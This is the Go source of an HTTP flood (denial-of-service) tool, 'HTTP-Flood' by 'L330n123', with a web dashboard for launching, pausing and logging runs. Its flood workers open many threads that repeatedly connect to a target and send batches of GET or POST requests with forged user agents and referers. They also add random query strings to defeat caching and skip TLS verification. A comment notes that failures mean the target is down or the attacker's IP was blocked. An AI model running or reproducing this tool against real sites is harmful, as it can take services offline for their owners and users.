const runSelectColumns = `id, target_url, threads, requests_per_conn, method, seconds,
	header_preset, header_text, status, error, created_at, started_at, completed_at, updated_at`

func (s *runStore) GetRun(id int64) (runRecord, error) {
	row := s.queryRow(`SELECT `+runSelectColumns+` FROM runs WHERE id = ?`, id)
	return scanRunRecord(row.Scan)
}

func (s *runStore) ListRuns(limit int) ([]runRecord, error) {
	if limit <= 0 || limit > 200 {
		limit = 50
	}
	rows, err := s.query(`SELECT `+runSelectColumns+` FROM runs ORDER BY id DESC LIMIT ?`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	runs := make([]runRecord, 0)
	for rows.Next() {
		run, err := scanRunRecord(rows.Scan)
		if err != nil {
			return nil, err
		}
		runs = append(runs, run)
	}
	return runs, rows.Err()
}

func (s *runStore) ListLogs(runID, afterID int64, limit int) ([]runLogRecord, error) {
	if limit <= 0 || limit > 1000 {
		limit = 500
	}
	if afterID < 0 {
		afterID = 0
	}
	rows, err := s.query(
		`SELECT id, run_id, layer, message, created_at
		 FROM run_logs
		 WHERE run_id = ? AND id > ?
		 ORDER BY id ASC
		 LIMIT ?`,
		runID, afterID, limit,
	)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	logs := make([]runLogRecord, 0)
	for rows.Next() {
		var log runLogRecord
		if err := rows.Scan(&log.ID, &log.RunID, &log.Layer, &log.Message, &log.CreatedAt); err != nil {
			return nil, err
		}
		logs = append(logs, log)
	}
	return logs, rows.Err()
}

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}
func getuseragent() string {

	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2)-1)]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3)-1)]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
	}
}

func readHeaderFile(path string) (string, error) {
	if path == "nil" {
		return "", nil
	}
	fi, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer fi.Close()
	br := bufio.NewReader(fi)
	var b strings.Builder
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		b.WriteString(string(a))
		b.WriteString("\r\n")
	}
	return b.String(), nil
}

func chromeBasicHeader() string {
	return "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n" +
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" +
		"Accept-Language: en-US,en;q=0.9\r\n" +
		"Accept-Encoding: gzip, deflate, br\r\n" +
		"Sec-Fetch-Site: none\r\n" +
		"Sec-Fetch-Mode: navigate\r\n" +
		"Sec-Fetch-Dest: document\r\n"
}

func normalizeHeaderPreset(preset, headerFile string) string {
	if preset == "custom" && headerFile != "nil" {
		return "custom"
	}
	if preset == "chrome_basic" {
		return "chrome_basic"
	}
	return "default"
}

func buildRequestHeader(runMode, runHost, runPort, runPage, headerFile, headerPreset string) (string, error) {
	addr := runHost + ":" + runPort
	headerPreset = normalizeHeaderPreset(headerPreset, headerFile)
	header := ""
	if runMode == "get" {
		header += " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if headerPreset == "chrome_basic" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += chromeBasicHeader()
			header += referers[rand.Intn(len(referers))] + "\r\n"
			return header, nil
		}
		if headerPreset == "default" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
			return header, nil
		}
		custom, err := readHeaderFile(headerFile)
		if err != nil {
			return "", err
		}
		header += custom
		return header, nil
	}

	data := "f"
	if headerPreset == "custom" {
		data = ""
		custom, err := readHeaderFile(headerFile)
		if err != nil {
			return "", err
		}
		header += custom
	}
	header += "POST " + runPage + " HTTP/1.1\r\nHost: " + addr + "\r\n"
	if headerPreset == "chrome_basic" {
		header += chromeBasicHeader()
	}
	header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
	if headerPreset != "chrome_basic" {
		header += "Accept-Encoding: gzip, deflate\r\n"
	}
	header += "\n" + data + "\r\n"
	return header, nil
}

func parseTarget(target string, logger *logBuffer) (string, string, string, string, error) {
	logger.Append("parse target", "input=%s", target)
	u, err := url.Parse(target)
	if err != nil {
		return "", "", "", "", fmt.Errorf("please input a correct url: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", "", "", "", fmt.Errorf("wrong scheme: only http or https")
	}
	tmp := strings.Split(u.Host, ":")
	runHost := tmp[0]
	runPort := u.Port()
	if u.Scheme == "https" {
		runPort = "443"
	}
	if runPort == "" {
		runPort = "80"
	}
	runPage := u.Path
	runKey := "?"
	if contain(runPage, "?") != 0 {
		runKey = "&"
	}
	logger.Append("parse target", "host=%s port=%s page=%s key=%s", runHost, runPort, runPage, runKey)
	return runHost, runPort, runPage, runKey, nil
}

func floodWorker(threadID int, runHost, runPort, runPage, runMode, runKey, headerFile, headerPreset string, requestsPerConn int, ready chan<- int, starter <-chan bool, control *runControl, stats *runRuntimeStats, logger *logBuffer) {
	addr := runHost + ":" + runPort
	headerPreset = normalizeHeaderPreset(headerPreset, headerFile)
	verboseThreadLog := logger.console
	if verboseThreadLog {
		logger.Append("build header", "thread=%d mode=%s header=%s preset=%s", threadID, runMode, headerFile, headerPreset)
	}
	header, err := buildRequestHeader(runMode, runHost, runPort, runPage, headerFile, headerPreset)
	if err != nil {
		if verboseThreadLog {
			logger.Append("build header", "thread=%d error=%v", threadID, err)
		}
		ready <- threadID
		return
	}
	ready <- threadID
	<-starter
	if stats != nil {
		stats.activeThreads.Add(1)
		defer stats.activeThreads.Add(-1)
	}
	if verboseThreadLog {
		logger.Append("thread ready", "thread=%d started", threadID)
	}
	done := control.done
	reportAt := time.Now().Add(2 * time.Second)
	var connectionErrors int
	var writeErrors int
	var successfulBatches int
	var writtenRequests int
	for {
		for control.paused.Load() {
			select {
			case <-done:
				if successfulBatches > 0 || writtenRequests > 0 || connectionErrors > 0 || writeErrors > 0 {
					if verboseThreadLog {
						logger.Append("progress", "thread=%d batches=%d requests=%d conn_errors=%d write_errors=%d", threadID, successfulBatches, writtenRequests, connectionErrors, writeErrors)
					}
				}
				if verboseThreadLog {
					logger.Append("stop", "thread=%d stopped while paused", threadID)
				}
				return
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
		select {
		case <-done:
			if successfulBatches > 0 || writtenRequests > 0 || connectionErrors > 0 || writeErrors > 0 {
				if verboseThreadLog {
					logger.Append("progress", "thread=%d batches=%d requests=%d conn_errors=%d write_errors=%d", threadID, successfulBatches, writtenRequests, connectionErrors, writeErrors)
				}
			}
			if verboseThreadLog {
				logger.Append("stop", "thread=%d stopped", threadID)
			}
			return
		default:
		}

		var s net.Conn
		if runPort == "443" {
			cfg := &tls.Config{InsecureSkipVerify: true, ServerName: runHost}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			connectionErrors++
			if stats != nil {
				stats.connectionErrors.Add(1)
			}
			if time.Now().After(reportAt) {
				if verboseThreadLog {
					logger.Append("progress", "thread=%d batches=%d requests=%d conn_errors=%d write_errors=%d", threadID, successfulBatches, writtenRequests, connectionErrors, writeErrors)
				}
				successfulBatches = 0
				writtenRequests = 0
				connectionErrors = 0
				writeErrors = 0
				reportAt = time.Now().Add(2 * time.Second)
			}
			continue
		}
		written := 0
		for i := 0; i < requestsPerConn; i++ {
			for control.paused.Load() {
				select {
				case <-done:
					s.Close()
					if verboseThreadLog {
						logger.Append("stop", "thread=%d stopped while paused during write", threadID)
					}
					return
				default:
					time.Sleep(100 * time.Millisecond)
				}
			}
			select {
			case <-done:
				s.Close()
				if verboseThreadLog {
					logger.Append("stop", "thread=%d stopped during write", threadID)
				}
				return
			default:
			}
			request := ""
			if runMode == "get" {
				request += "GET " + runPage + runKey
				request += strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
			}
			request += header + "\r\n"
			if _, err := s.Write([]byte(request)); err != nil {
				writeErrors++
				if stats != nil {
					stats.writeErrors.Add(1)
				}
				break
			}
			written++
			if stats != nil {
				stats.totalSent.Add(1)
			}
		}
		if written > 0 {
			successfulBatches++
			writtenRequests += written
		}
		if time.Now().After(reportAt) {
			if verboseThreadLog {
				logger.Append("progress", "thread=%d batches=%d requests=%d conn_errors=%d write_errors=%d", threadID, successfulBatches, writtenRequests, connectionErrors, writeErrors)
			}
			successfulBatches = 0
			writtenRequests = 0
			connectionErrors = 0
			writeErrors = 0
			reportAt = time.Now().Add(2 * time.Second)
		}
		s.Close()
	}
}

func runFlood(target string, threads int, requestsPerConn int, runMode string, seconds int, headerFile, headerPreset string, waitForEnter bool, control *runControl, stats *runRuntimeStats, logger *logBuffer) error {
	if runMode != "get" && runMode != "post" {
		return fmt.Errorf("wrong mode, only can use get or post")
	}
	if threads <= 0 {
		return fmt.Errorf("threads should be positive")
	}
	if seconds <= 0 {
		return fmt.Errorf("limit should be positive")
	}
	if requestsPerConn <= 0 {
		return fmt.Errorf("requests per connection should be positive")
	}
	if control == nil {
		control = newRunControl()
	}
	if control.done == nil {
		control.done = make(chan struct{})
	}
	runHost, runPort, runPage, runKey, err := parseTarget(target, logger)
	if err != nil {
		return err
	}

	headerPreset = normalizeHeaderPreset(headerPreset, headerFile)
	logger.Append("prepare threads", "threads=%d requests_per_conn=%d seconds=%d preset=%s", threads, requestsPerConn, seconds, headerPreset)
	starter := make(chan bool)
	ready := make(chan int, threads)
	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go floodWorker(i+1, runHost, runPort, runPage, runMode, runKey, headerFile, headerPreset, requestsPerConn, ready, starter, control, stats, logger)
	}
	for i := 0; i < threads; i++ {
		threadID := <-ready
		if logger.console {
			logger.Append("thread ready", "thread=%d ready", threadID)
		}
		if logger.console {
			fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
			os.Stdout.Sync()
		}
	}
	if waitForEnter {
		input := bufio.NewReader(os.Stdin)
		fmt.Printf("\nPlease [Enter] for continue")
		if _, err := input.ReadString('\n'); err != nil {
			return err
		}
	}
	logger.Append("start", "flood will end in %d seconds", seconds)
	close(starter)
	remaining := time.Duration(seconds) * time.Second
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()
	nextHeartbeat := time.Now().Add(5 * time.Second)
	for remaining > 0 {
		select {
		case <-control.done:
			switch control.stopReason.Load() {
			case runStopReasonStopped:
				logger.Append("stop", "flood stopped by user")
			case runStopReasonDeleted:
				logger.Append("stop", "flood stopped by delete request")
			default:
				logger.Append("stop", "flood interrupted")
			}
			return nil
		case <-ticker.C:
			if control.paused.Load() {
				continue
			}
			remaining -= 200 * time.Millisecond
			if time.Now().After(nextHeartbeat) {
				remainingSec := int((remaining + time.Second - 1) / time.Second)
				if remainingSec < 0 {
					remainingSec = 0
				}
				logger.Append("heartbeat", "running remaining=%ds", remainingSec)
				nextHeartbeat = time.Now().Add(5 * time.Second)
			}
		}
	}
	control.Stop(runStopReasonTimeout)
	logger.Append("stop", "flood completed")
	return nil
}

func webDatabaseURL() string {
	if value := strings.TrimSpace(os.Getenv("HTTPFLOOD_DATABASE_URL")); value != "" {
		return value
	}
	if legacy := strings.TrimSpace(os.Getenv("HTTPFLOOD_DB")); strings.HasPrefix(legacy, "postgres://") || strings.HasPrefix(legacy, "postgresql://") {
		return legacy
	}
	return "postgres://postgres:postgres@localhost:5432/httpflood?sslmode=disable"
}

func webSQLiteMigrateFrom() string {
	return strings.TrimSpace(os.Getenv("HTTPFLOOD_SQLITE_MIGRATE_FROM"))
}

func webSQLiteDeleteAfterMigrate() bool {
	value := strings.ToLower(strings.TrimSpace(os.Getenv("HTTPFLOOD_SQLITE_DELETE_AFTER_MIGRATE")))
	return value == "1" || value == "true" || value == "yes"
}

func webListenAddr() string {
	if value := strings.TrimSpace(os.Getenv("HTTPFLOOD_ADDR")); value != "" {
		return value
	}
	return ":8080"
}

func webMaxLogsPerRun() int64 {
	value := strings.TrimSpace(os.Getenv("HTTPFLOOD_MAX_LOGS_PER_RUN"))
	if value == "" {
		return 1000
	}
	parsed, err := strconv.ParseInt(value, 10, 64)
	if err != nil || parsed <= 0 {
		return 1000
	}
	return parsed
}

func webLogsFetchLimit() int {
	value := strings.TrimSpace(os.Getenv("HTTPFLOOD_LOG_FETCH_LIMIT"))
	if value == "" {
		return 200
	}
	parsed, err := strconv.Atoi(value)
	if err != nil || parsed <= 0 {
		return 200
	}
	if parsed > 500 {
		return 500
	}
	return parsed
}

func isRunTerminal(status string) bool {
	switch status {
	case "completed", "failed", "stopped", "interrupted":
		return true
	default:
		return false
	}
}

func startWebServer() {
	store, err := openRunStore(webDatabaseURL())
	if err != nil {
		fmt.Println("Failed to open PostgreSQL store:", err)
		return
	}
	defer store.Close()
	webStore = store
	if sqlitePath := webSQLiteMigrateFrom(); sqlitePath != "" {
		if err := webStore.ImportFromSQLite(sqlitePath, webSQLiteDeleteAfterMigrate()); err != nil {
			fmt.Println("Failed to migrate SQLite data:", err)
			return
		}
	}
	if err := webStore.ensureSingleAdmin(); err != nil {
		fmt.Println("Failed to initialize admin account:", err)
		return
	}
	webStore.purgeExpiredSessions()

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/login", handleLoginPage)
	mux.HandleFunc("/monitor", handleMonitorPage)
	mux.HandleFunc("/accounts", handleAccountsPage)
	mux.HandleFunc("/api/login", handleLoginAPI)
	mux.HandleFunc("/api/logout", handleLogoutAPI)
	mux.HandleFunc("/api/me", handleMeAPI)
	mux.HandleFunc("/api/runs", handleRuns)
	mux.HandleFunc("/api/runs/", handleRunResource)
	mux.HandleFunc("/api/accounts", handleAccountsAPI)
	mux.HandleFunc("/api/accounts/", handleAccountResourceAPI)
	mux.HandleFunc("/api/system/metrics", handleMonitorMetricsAPI)

	listenAddr := webListenAddr()
	fmt.Println("Starting httpflood UI on", listenAddr)
	fmt.Println("PostgreSQL store: configured")
	if err := http.ListenAndServe(listenAddr, mux); err != nil {
		fmt.Println("Failed to start UI:", err)
	}
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	if _, ok := requireAuthPage(w, r); !ok {
		return
	}
	data := pageData{Method: "get", HeaderPreset: "default"}
	renderPage(w, data)
}

func handleRuns(w http.ResponseWriter, r *http.Request) {
	if webStore == nil {
		writeJSONError(w, http.StatusServiceUnavailable, "database store is not ready")
		return
	}
	user, ok := requireAuthAPI(w, r)
	if !ok {
		return
	}
	switch r.Method {
	case http.MethodGet:
		runs, err := webStore.ListRuns(50)
		if err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{"runs": runs})
	case http.MethodPost:
		if !user.CanStartRun && !isAdmin(user) {
			writeJSONError(w, http.StatusForbidden, "run creation denied by account permission")
			return
		}
		req, err := parseStartRunRequest(r)
		if err != nil {
			writeJSONError(w, http.StatusBadRequest, err.Error())
			return
		}
		run, err := webStore.CreateRun(req)
		if err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		control := newRunControl()
		stats := newRunRuntimeStats()
		runControls.Set(run.ID, control)
		runStats.Set(run.ID, stats)
		go executeStoredRun(run, control, stats)
		writeJSON(w, http.StatusAccepted, map[string]interface{}{"run": run})
	default:
		w.Header().Set("Allow", "GET, POST")
		writeJSONError(w, http.StatusMethodNotAllowed, "method not allowed")
	}
}

func handleRunResource(w http.ResponseWriter, r *http.Request) {
	if webStore == nil {
		writeJSONError(w, http.StatusServiceUnavailable, "database store is not ready")
		return
	}
	user, ok := requireAuthAPI(w, r)
	if !ok {
		return
	}
	rest := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/runs/"), "/")
	parts := strings.Split(rest, "/")
	if len(parts) == 0 || parts[0] == "" {
		http.NotFound(w, r)
		return
	}
	runID, err := strconv.ParseInt(parts[0], 10, 64)
	if err != nil || runID <= 0 {
		writeJSONError(w, http.StatusBadRequest, "invalid run id")
		return
	}
	if len(parts) == 1 && r.Method == http.MethodGet {
		run, err := webStore.GetRun(runID)
		if err == sql.ErrNoRows {
			writeJSONError(w, http.StatusNotFound, "run not found")
			return
		}
		if err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{"run": run})
		return
	}
	if len(parts) == 1 && r.Method == http.MethodDelete {
		if !user.CanStartRun && !isAdmin(user) {
			writeJSONError(w, http.StatusForbidden, "run control denied by account permission")
			return
		}
		run, err := webStore.GetRun(runID)
		if err == sql.ErrNoRows {
			writeJSONError(w, http.StatusNotFound, "run not found")
			return
		}
		if err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		if control, exists := runControls.Get(runID); exists {
			control.Stop(runStopReasonDeleted)
		}
		if err := webStore.DeleteRun(runID); err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		runControls.Delete(runID)
		runStats.Delete(runID)
		writeJSON(w, http.StatusOK, map[string]interface{}{"deleted": run.ID})
		return
	}
	if len(parts) == 2 && parts[1] == "stats" && r.Method == http.MethodGet {
		run, err := webStore.GetRun(runID)
		if err == sql.ErrNoRows {
			writeJSONError(w, http.StatusNotFound, "run not found")
			return
		}
		if err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		stats, exists := runStats.Get(runID)
		if !exists {
			snapshot := runRuntimeStatsSnapshot{RunID: runID}
			if run.StartedAt != "" {
				if startedAt, parseErr := time.Parse(time.RFC3339, run.StartedAt); parseErr == nil {
					endAt := time.Now()
					if run.CompletedAt != "" {
						if completedAt, parseCompletedErr := time.Parse(time.RFC3339, run.CompletedAt); parseCompletedErr == nil {
							endAt = completedAt
						}
					}
					if endAt.After(startedAt) {
						snapshot.ElapsedSeconds = int64(endAt.Sub(startedAt).Seconds())
					}
				}
			}
			writeJSON(w, http.StatusOK, map[string]interface{}{"stats": snapshot})
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{"stats": stats.Snapshot(runID)})
		return
	}
	if len(parts) == 2 && r.Method == http.MethodPost {
		if !user.CanStartRun && !isAdmin(user) {
			writeJSONError(w, http.StatusForbidden, "run control denied by account permission")
			return
		}
		action := parts[1]
		run, err := webStore.GetRun(runID)
		if err == sql.ErrNoRows {
			writeJSONError(w, http.StatusNotFound, "run not found")
			return
		}
		if err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		control, exists := runControls.Get(runID)
		if !exists || isRunTerminal(run.Status) {
			writeJSONError(w, http.StatusConflict, "run is not active")
			return
		}
		switch action {
		case "pause":
			control.Pause()
			if err := webStore.SetRunStatus(runID, "paused", ""); err != nil {
				writeJSONError(w, http.StatusInternalServerError, err.Error())
				return
			}
			writeJSON(w, http.StatusOK, map[string]interface{}{"run_id": runID, "status": "paused"})
			return
		case "resume":
			control.Resume()
			if err := webStore.SetRunStatus(runID, "running", ""); err != nil {
				writeJSONError(w, http.StatusInternalServerError, err.Error())
				return
			}
			writeJSON(w, http.StatusOK, map[string]interface{}{"run_id": runID, "status": "running"})
			return
		case "stop":
			control.Resume()
			control.Stop(runStopReasonStopped)
			if err := webStore.SetRunStatus(runID, "stopping", "stopping by user"); err != nil {
				writeJSONError(w, http.StatusInternalServerError, err.Error())
				return
			}
			writeJSON(w, http.StatusOK, map[string]interface{}{"run_id": runID, "status": "stopping"})
			return
		default:
			http.NotFound(w, r)
			return
		}
	}
	if len(parts) == 2 && parts[1] == "logs" && r.Method == http.MethodGet {
		afterID, _ := strconv.ParseInt(r.URL.Query().Get("after_id"), 10, 64)
		limit := webLogsFetchLimit()
		if q := strings.TrimSpace(r.URL.Query().Get("limit")); q != "" {
			if parsed, err := strconv.Atoi(q); err == nil && parsed > 0 {
				if parsed > 500 {
					limit = 500
				} else {
					limit = parsed
				}
			}
		}
		logs, err := webStore.ListLogs(runID, afterID, limit)
		if err != nil {
			writeJSONError(w, http.StatusInternalServerError, err.Error())
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{"logs": logs})
		return
	}
	http.NotFound(w, r)
}

func parseStartRunRequest(r *http.Request) (startRunRequest, error) {
	if err := parseWebForm(r); err != nil {
		return startRunRequest{}, err
	}
	threads, err := parsePositiveFormInt(r, "threads", 20)
	if err != nil {
		return startRunRequest{}, err
	}
	requestsPerConn, err := parsePositiveFormInt(r, "requests_per_conn", 100)
	if err != nil {
		return startRunRequest{}, err
	}
	seconds, err := parsePositiveFormInt(r, "seconds", 10)
	if err != nil {
		return startRunRequest{}, err
	}
	headerText := r.FormValue("headers")
	headerFile := "nil"
	if strings.TrimSpace(headerText) != "" {
		headerFile = "inline"
	}
	req := startRunRequest{
		URL:             strings.TrimSpace(r.FormValue("url")),
		Threads:         threads,
		RequestsPerConn: requestsPerConn,
		Method:          strings.ToLower(strings.TrimSpace(r.FormValue("method"))),
		Seconds:         seconds,
		HeaderPreset:    normalizeHeaderPreset(strings.TrimSpace(r.FormValue("header_preset")), headerFile),
		HeaderText:      headerText,
	}
	if req.URL == "" {
		return startRunRequest{}, fmt.Errorf("target url is required")
	}
	if req.Method == "" {
		req.Method = "get"
	}
	if req.Method != "get" && req.Method != "post" {
		return startRunRequest{}, fmt.Errorf("wrong mode, only can use get or post")
	}
	return req, nil
}

func parseWebForm(r *http.Request) error {
	contentType := r.Header.Get("Content-Type")
	if strings.HasPrefix(contentType, "multipart/form-data") {
		return r.ParseMultipartForm(4 << 20)
	}
	return r.ParseForm()
}

func parsePositiveFormInt(r *http.Request, name string, fallback int) (int, error) {
	value := strings.TrimSpace(r.FormValue(name))
	if value == "" {
		return fallback, nil
	}
	parsed, err := strconv.Atoi(value)
	if err != nil || parsed <= 0 {
		return 0, fmt.Errorf("%s should be a positive integer", name)
	}
	return parsed, nil
}

func executeStoredRun(run runRecord, control *runControl, stats *runRuntimeStats) {
	req := startRunRequest{
		URL:             run.TargetURL,
		Threads:         run.Threads,
		RequestsPerConn: run.RequestsPerConn,
		Method:          run.Method,
		Seconds:         run.Seconds,
		HeaderPreset:    run.HeaderPreset,
		HeaderText:      run.HeaderText,
	}
	if err := webStore.MarkRunStarted(run.ID); err != nil {
		fmt.Println("Failed to mark run started:", err)
		runControls.Delete(run.ID)
		runStats.Delete(run.ID)
		return
	}
	defer runControls.Delete(run.ID)

	maxLogs := webMaxLogsPerRun()
	var persistedLogs atomic.Int64
	var droppedLogs atomic.Int64
	logger := &logBuffer{
		keep:    false,
		maxKeep: 0,
		sink: func(layer, message string) {
			if control.stopReason.Load() == runStopReasonDeleted {
				return
			}
			if persistedLogs.Load() >= maxLogs {
				droppedLogs.Add(1)
				return
			}
			if err := webStore.AppendLog(run.ID, layer, message); err != nil {
				if control.stopReason.Load() == runStopReasonDeleted || strings.Contains(err.Error(), "FOREIGN KEY constraint failed") {
					return
				}
				fmt.Println("Failed to persist log:", err)
				return
			}
			persistedLogs.Add(1)
		},
	}
	logger.Append("run", "run=%d target=%s threads=%d requests_per_conn=%d seconds=%d", run.ID, req.URL, req.Threads, req.RequestsPerConn, req.Seconds)

	headerFile := "nil"
	if strings.TrimSpace(req.HeaderText) != "" {
		tmpName := filepath.Join(os.TempDir(), fmt.Sprintf("httpflood-header-%d-%d.txt", run.ID, time.Now().UnixNano()))
		if err := os.WriteFile(tmpName, []byte(req.HeaderText), 0o600); err != nil {
			logger.Append("header", "unable to save headers: %v", err)
			_ = webStore.FinishRun(run.ID, "failed", err.Error())
			return
		}
		defer os.Remove(tmpName)
		headerFile = tmpName
	}
	req.HeaderPreset = normalizeHeaderPreset(req.HeaderPreset, headerFile)

	if err := runFlood(req.URL, req.Threads, req.RequestsPerConn, req.Method, req.Seconds, headerFile, req.HeaderPreset, false, control, stats, logger); err != nil {
		if droppedLogs.Load() > 0 {
			_ = webStore.AppendLog(run.ID, "log", fmt.Sprintf("dropped_logs=%d due to HTTPFLOOD_MAX_LOGS_PER_RUN=%d", droppedLogs.Load(), maxLogs))
		}
		logger.Append("run", "failed: %v", err)
		_ = webStore.FinishRun(run.ID, "failed", err.Error())
		return
	}
	if control.stopReason.Load() == runStopReasonStopped {
		_ = webStore.FinishRun(run.ID, "stopped", "stopped by user")
		return
	}
	if control.stopReason.Load() == runStopReasonDeleted {
		return
	}
	if droppedLogs.Load() > 0 {
		_ = webStore.AppendLog(run.ID, "log", fmt.Sprintf("dropped_logs=%d due to HTTPFLOOD_MAX_LOGS_PER_RUN=%d", droppedLogs.Load(), maxLogs))
	}
	logger.Append("run", "completed")
	_ = webStore.FinishRun(run.ID, "completed", "")
}

func writeJSON(w http.ResponseWriter, status int, payload interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		fmt.Println("Failed to write JSON response:", err)
	}
}

func writeJSONError(w http.ResponseWriter, status int, message string) {
	writeJSON(w, status, map[string]string{"error": message})
}

func renderPage(w http.ResponseWriter, data pageData) {
	if err := pageTemplate.Execute(w, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func main() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||                     Golang version 2.0      ")
	fmt.Println("                                                        C0d3d By L330n123")
	fmt.Println("==========================================================================")
	if len(os.Args) > 1 && os.Args[1] == "serve" {
		startWebServer()
		return
	}
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
